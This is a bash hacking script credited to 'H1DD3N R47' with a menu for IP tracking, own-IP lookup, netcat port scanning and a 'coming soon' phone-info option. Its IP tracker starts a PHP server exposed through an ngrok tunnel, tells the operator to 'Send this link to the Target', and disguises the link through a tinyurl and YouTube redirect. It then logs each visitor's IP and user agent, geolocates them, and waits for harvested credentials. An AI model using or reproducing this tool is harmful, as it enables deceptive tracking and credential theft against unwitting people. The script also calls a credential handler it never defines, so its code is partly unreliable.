#!/bin/bash
#CODED BY H1DD3N R47


trap 'printf "\n";stop;exit 1' 2


dependencies() {

command -v php > /dev/null 2>&1 || { echo >&2 "I require php but it's not installed. Install it. Aborting."; exit 1; }
command -v curl > /dev/null 2>&1 || { echo >&2 "I require curl but it's not installed. Install it. Aborting."; exit 1; }

}

menu() {
printf "\e[32m"
printf "[1]Ip Tracker\n"
printf "[2]My info\n"
printf "[3]Port Scan\n"
printf "[4]Phone Info\n"
printf "[0]Exit"
read -p $'\n\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Choose an option: \e[0m' option


if [[ $option == 1 || $option == 01 ]]; then
server="hackd"
start1

elif [[ $option == 2 || $option == 02 ]]; then
my

elif [[ $option == 3 || $option == 03 ]]; then
po

elif [[ $option == 4 || $option == 04 ]]; then
ph

elif [[ $option == 0 ]]; then
exit 1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
clear
banner
menu
fi
}

stop() {

checkngrok=$(ps aux | grep -o "ngrok" | head -n1)
checkphp=$(ps aux | grep -o "php" | head -n1)
checkssh=$(ps aux | grep -o "ssh" | head -n1)
if [[ $checkngrok == *'ngrok'* ]]; then
pkill -f -2 ngrok > /dev/null 2>&1
killall -2 ngrok > /dev/null 2>&1
fi
if [[ $checkphp == *'php'* ]]; then
pkill -f -2 php > /dev/null 2>&1
killall -2 php > /dev/null 2>&1
fi
if [[ $checkssh == *'ssh'* ]]; then
pkill -f -2 ssh > /dev/null 2>&1
killall ssh > /dev/null 2>&1
fi
if [[ -e sendlink ]]; then
rm -rf sendlink
fi

}

banner() {

printf "\e[96m"
echo '╔╗ ╔╗╔╗╔═══╦═══╦═══╦═╗─╔╗  ╔╗╔═╗ ╔╦═══╦═══╗'
echo '║║ ║╠╝║╚╗╔╗╠╗╔╗║╔═╗║║╚╗║║ ╔╝║║║╚╗║║╔══╣╔═╗║'
echo '║╚═╝╠╗║ ║║║║║║║╠╝╔╝║╔╗╚╝║ ╚╗║║╔╗╚╝║╚══╣║║║║'
echo '║╔═╗║║║ ║║║║║║║╠╗╚╗║║╚╗║║  ║║║║╚╗║║╔══╣║║║║'
echo '║║ ║╠╝╚╦╝╚╝╠╝╚╝║╚═╝║║ ║║║ ╔╝╚╣║ ║║║║  ║╚═╝║'
echo '╚╝ ╚╩══╩═══╩═══╩═══╩╝ ╚═╝ ╚══╩╝ ╚═╩╝  ╚═══╝'
echo '             CODED BY H1DD3N R47'

}


re() {
printf "\e[92m"
echo '[!]YOU WHANT GO RETUAN MENU (Y/N)'
read -p $'ENTER:' op

if [[ $op == Y || $op == y ]]; then 

banner
menu

elif [[ $op == N || $op == n ]]; then
sleep 1
echo 'BY...!'
exit 1

else
printf "\e[1;93m [!] Invalid option!\e[0m\n"
sleep 1
re

fi
}


catch_ip() {
ip=$(grep -a 'IP:' sites/$server/ip.txt | cut -d " " -f2 | tr -d '\r')
IFS=$'\n'
ua=$(grep 'User-Agent:' sites/$server/ip.txt | cut -d '"' -f2)
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Target IP:\e[0m\e[1;77m %s\e[0m\n" $ip
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] User-Agent:\e[0m\e[1;77m %s\e[0m\n" $ua
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Saved:\e[0m\e[1;77m %s/saved.ip.txt\e[0m\n" $server
cat sites/$server/ip.txt >> sites/$server/saved.ip.txt



IFS='\n'
iptracker=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$ip" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > iptracker.log)
IFS=$'\n'
continent=$(grep -o 'Continent.*' iptracker.log | head -n1 | cut -d ">" -f3 | cut -d "<" -f1)
printf "\n"
hostnameip=$(grep  -o "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f7 | cut -d ">" -f2)
if [[ $hostnameip != "" ]]; then
printf "\e[1;92m[*] Hostname:\e[0m\e[1;77m %s\e[0m\n" $hostnameip
fi
##

reverse_dns=$(grep -a "</td></tr><tr><th>Hostname:.*" iptracker.log | cut -d "<" -f1)
if [[ $reverse_dns != "" ]]; then
printf "\e[1;92m[*] Reverse DNS:\e[0m\e[1;77m %s\e[0m\n" $reverse_dns
fi
##


if [[ $continent != "" ]]; then
printf "\e[1;92m[*] IP Continent:\e[0m\e[1;77m %s\e[0m\n" $continent
fi
##

country=$(grep -o 'Country:.*' iptracker.log | cut -d ">" -f3 | cut -d "&" -f1)
if [[ $country != "" ]]; then
printf "\e[1;92m[*] IP Country:\e[0m\e[1;77m %s\e[0m\n" $country
fi
##

state=$(grep -o "tracking lessimpt.*" iptracker.log | cut -d "<" -f1 | cut -d ">" -f2)
if [[ $state != "" ]]; then
printf "\e[1;92m[*] State:\e[0m\e[1;77m %s\e[0m\n" $state
fi
##
city=$(grep -o "City Location:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $city != "" ]]; then
printf "\e[1;92m[*] City Location:\e[0m\e[1;77m %s\e[0m\n" $city
fi
##

isp=$(grep -o "ISP:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $isp != "" ]]; then
printf "\e[1;92m[*] ISP:\e[0m\e[1;77m %s\e[0m\n" $isp
fi
##

as_number=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $as_number != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $as_number
fi
##

ip_speed=$(grep -o "IP Address Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)
if [[ $ip_speed != "" ]]; then
printf "\e[1;92m[*] IP Address Speed:\e[0m\e[1;77m %s\e[0m\n" $ip_speed
fi
##
ip_currency=$(grep -o "IP Currency:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ip_currency != "" ]]; then
printf "\e[1;92m[*] IP Currency:\e[0m\e[1;77m %s\e[0m\n" $ip_currency
fi
##

Capital=$(grep -o "Capital:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $Capital != "" ]]; then
printf "\e[1;92m[*] IP Capital:\e[0m\e[1;77m %s\e[0m\n" $Capital
fi
##

Postal=$(grep -o "Postal:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $Postal != "" ]]; then
printf "\e[1;92m[*] Postal:\e[0m\e[1;77m %s\e[0m\n" $Postal
fi
##

ASNumber=$(grep -o "AS Number:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $ASNumber != "" ]]; then
printf "\e[1;92m[*] AS Number:\e[0m\e[1;77m %s\e[0m\n" $ASNumber
fi
##

WindSpeed=$(grep -o "Wind Speed:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $WindSpeed != "" ]]; then
printf "\e[1;92m[*] Wind Speed:\e[0m\e[1;77m %s\e[0m\n" $WindSpeed
fi
##

TimeZone=$(grep -o "Time Zone:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $TimeZone != "" ]]; then
printf "\e[1;92m[*] Time Zone:\e[0m\e[1;77m %s\e[0m\n" $TimeZone
fi
##

LocalTime=$(grep -o "Local Time:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $LocalTime != "" ]]; then
printf "\e[1;92m[*] Local Time:\e[0m\e[1;77m %s\e[0m\n" $LocalTime
fi
##

Temp=$(grep -o "Temp:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $Temp != "" ]]; then
printf "\e[1;92m[*] Temp:\e[0m\e[1;77m %s\e[0m\n" $Temp
fi
##
printf "\n"
printf "\e[31m"
echo -e '     \e[5mExtra Information for an IP Address:\e[25m'$hostnameip
printf "\n"

Continent=$(grep -o "Continent Lat/Lon:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $Continent != "" ]]; then
printf "\e[1;92m[*]Continent Lat/Lon:\e[0m\e[1;77m %s\e[0m\n" $Continent
fi
##

City=$(grep -o "City Lat/Lon:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $City != "" ]]; then
printf "\e[1;92m[*]City Lat/Lon::\e[0m\e[1;77m %s\e[0m\n" $City
fi
##

Country=$(grep -o "Country Lat/Lon:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $Continent != "" ]]; then
printf "\e[1;92m[*]Country Lat/Lon:\e[0m\e[1;77m %s\e[0m\n" $Country
fi
##

IPLanguage=$(grep -o "IP Language:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $IPLanguage != "" ]]; then
printf "\e[1;92m[*]IP Language:\e[0m\e[1;77m %s\e[0m\n" $IPLanguage
fi
##

IDDCode=$(grep -o "IDD Code:.*" iptracker.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $IDDCode != "" ]]; then
printf "\e[1;92m[*]IDD Code:\e[0m\e[1;77m %s\e[0m\n" $IDDCode
fi
##

printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Waiting Credentials and Next IP, Press Ctrl + C to exit...\e[0m\n"
rm -rf iptracker.log
##

}








start() {
if [[ -e sites/$server/ip.txt ]]; then
rm -rf sites/$server/ip.txt

fi



if [[ -e ngrok ]]; then
echo ""
else
command -v unzip > /dev/null 2>&1 || { echo >&2 "I require unzip but it's not installed. Install it. Aborting."; exit 1; }
command -v wget > /dev/null 2>&1 || { echo >&2 "I require wget but it's not installed. Install it. Aborting."; exit 1; }
printf "\e[1;92m[\e[0m*\e[1;92m] Downloading Ngrok...\n"
arch=$(uname -a | grep -o 'arm' | head -n1)
arch2=$(uname -a | grep -o 'Android' | head -n1)
if [[ $arch == *'arm'* ]] || [[ $arch2 == *'Android'* ]] ; then
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-arm.zip > /dev/null 2>&1

if [[ -e ngrok-stable-linux-arm.zip ]]; then
unzip ngrok-stable-linux-arm.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-arm.zip
else
printf "\e[1;93m[!] Download error... Termux, run:\e[0m\e[1;77m pkg install wget\e[0m\n"
exit 1
fi



else
wget --no-check-certificate https://bin.equinox.io/c/4VmDzA7iaHb/ngrok-stable-linux-386.zip > /dev/null 2>&1 
if [[ -e ngrok-stable-linux-386.zip ]]; then
unzip ngrok-stable-linux-386.zip > /dev/null 2>&1
chmod +x ngrok
rm -rf ngrok-stable-linux-386.zip
else
printf "\e[1;93m[!] Download error... \e[0m\n"
exit 1
fi
fi
fi

printf "\e[1;92m[\e[0m*\e[1;92m] Starting php server...\n"
cd sites/$server && php -S 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 2
printf "\e[1;92m[\e[0m*\e[1;92m] Starting ngrok server...\n"
./ngrok http 127.0.0.1:3333 > /dev/null 2>&1 &
sleep 10

link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
printf "\e[1;92m[\e[0m*\e[1;92m] Send this link to the Target:\e[0m\e[1;77m %s\e[0m\n" $link
send_ip=$(curl -s "http://tinyurl.com/api-create.php?url=https://www.youtube.com/redirect?v=636B9Qh-fqU&redir_token=j8GGFy4s0H5jIRVfuChglne9fQB8MTU4MjM5MzM0N0AxNTgyMzA2OTQ3&event=video_description&q=$link" | head -n1)
#send_ip=$(curl -s http://tinyurl.com/api-create.php?url=$send_link | head -n1)
printf '\n\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Or using tinyurl:\e[0m\e[1;77m %s \n' $send_ip
printf "\n"

checkfound
}

start1() {
if [[ -e sendlink ]]; then
rm -rf sendlink
fi
start


}
checkfound() {

printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Waiting IPs and Credentials,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "sites/$server/ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m*\e[1;92m] IP Found!\n"
catch_ip
rm -rf sites/$server/ip.txt
fi
sleep 0.5
if [[ -e "sites/$server/usernames.txt" ]]; then
printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credentials Found!\n"
catch_cred
rm -rf sites/$server/usernames.txt
fi
sleep 0.5


done 

}
banner

ph() {

echo '╔═══╦═══╦═╗╔═╦══╦═╗ ╔╦═══╗ ╔═══╦═══╦═══╦═╗ ╔╗'
echo '║╔═╗║╔═╗║║╚╝║╠╣╠╣║╚╗║║╔═╗║ ║╔═╗║╔═╗║╔═╗║║╚╗║║'
echo '║║ ╚╣║ ║║╔╗╔╗║║║║╔╗╚╝║║ ╚╝ ║╚══╣║║║║║║║║╔╗╚╝║'
echo '║║ ╔╣║ ║║║║║║║║║║║╚╗║║║╔═╗ ╚══╗║║║║║║║║║║╚╗║║'
echo '║ ═╝║╚═╝║║║║║╠╣╠╣║ ║║║╚╩═║ ║╚═╝║╚═╝║╚═╝║║ ║║║'
echo '╚═══╩═══╩╝╚╝╚╩══╩╝ ╚═╩═══╝ ╚═══╩═══╩═══╩╝ ╚═╝'
echo '         COMING SOON NEXT UPDATE'
re
}



my() {
touch myinfo && echo "" > myinfo
curl "ifconfig.me/all" -s  > myinfo

my_ip=$(grep -o 'ip_addr:.*' myinfo | cut -d " " -f2)
remote_ip=$(grep -o 'remote_host:.*' myinfo | cut -d " " -f2)
printf "\e[1;92m[*] My ip:\e[0m\e[1;77m %s\e[0m\n" $my_ip
printf "\e[1;92m[*] Remote Host:\e[0m\e[1;77m %s\e[0m\n" $remote_ip
rm -rf myinfo
re
}



function portrange() {
if [[ -e open.ports ]]; then
rm -rf open.ports
fi
if [[ -e ports ]]; then
rm -rf ports
fi

read -p $'\e[1;92m[*] Port Range (E.g. 1 1000): \e[0m' port_range
for x in $(seq $port_range); do echo $x >> ports; done
default_threads="10"
read -p $'\e[1;92m[*] Threads (Default: 10): \e[0m' threads
threads="${threads:-${default_threads}}"
count_ports=$(wc -l ports | cut -d " " -f1)

printf "\e[1;91m[*] Press Ctrl + C to stop\n\e[0m"
token=0
startline=1
endline="$threads"
while [ $token -lt $count_ports ]; do
IFS=$'\n'
for port in $(sed -n ''$startline','$endline'p' ports); do

IFS=$'\n'
countport=$(grep -n -x "$port" ports | cut -d ":" -f1)


let token++
printf "\e[1;77mScanning port (%s/%s)\e[0m\n" $countport $count_ports

{(trap '' SIGINT && scan=$( nc -z -v -w3 $host $port 2>&1 >/dev/null | grep -o 'open'); if [[ $scan == "open" ]]; then printf "\e[1;92m \n [*] Port Open:\e[0m\e[1;77m %s\e[0m\n\n" $port; printf "%s\n" $port >> open.ports ; fi; ) } & done; wait $!;

let startline+=$threads
let endline+=$threads

done
if [[ -e open.ports ]]; then
total=$(wc -l open.ports | cut -d " " -f1)
printf "\e[1;92m[*] Total Open ports:\e[0m\e[1;77m %s\e[0m\n" $total
printf "\e[1;77m\n"
cat open.ports
rm -rf open.ports
rm -rf ports
printf "\e[0m\n"
fi
re
}


po() {

read -p $'\e[1;92m[*] Host: \e[0m' host
printf "\e[1;92m[*] Choose an option:\e[0m\n"
read -p $'\e[1;92m[*] \e[0m\e[1;77m1)\e[0m\e[1;92m Single Port, \e[0m\e[1;77m2)\e[0m\e[1;92m Port Range: \e[0m' choice_port

if [[ $choice_port == "1" ]]; then
read -p $'\e[1;92m[*] Port: \e[0m' single_port

check=$(nc -z -v -w3 $host $single_port 2>&1 >/dev/null | grep -o 'open')
if [[ $check == "open" ]]; then
printf "\e[1;92m[*] Open!\e[0m\n"
else
printf "\e[1;93m[*] Close!\e[0m\n"
fi
re
elif [[ $choice_port == "2" ]]; then
portrange
fi
}
rm -rf iptracker.log
menu

